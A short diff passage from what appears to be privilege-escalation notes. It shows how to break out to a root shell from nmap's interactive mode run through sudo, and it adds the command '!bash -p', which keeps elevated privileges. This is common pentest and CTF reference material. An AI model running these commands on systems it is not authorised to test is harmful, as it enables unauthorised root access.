@@ -98,6 +98,8 @@ Old way.
     sudo nmap --interactive
     nmap> !sh
     sh-4.1#
+    or
+    !bash -p
     Note : nmap –interactive option not available in latest nmap.
 
 Latest Way without –interactive
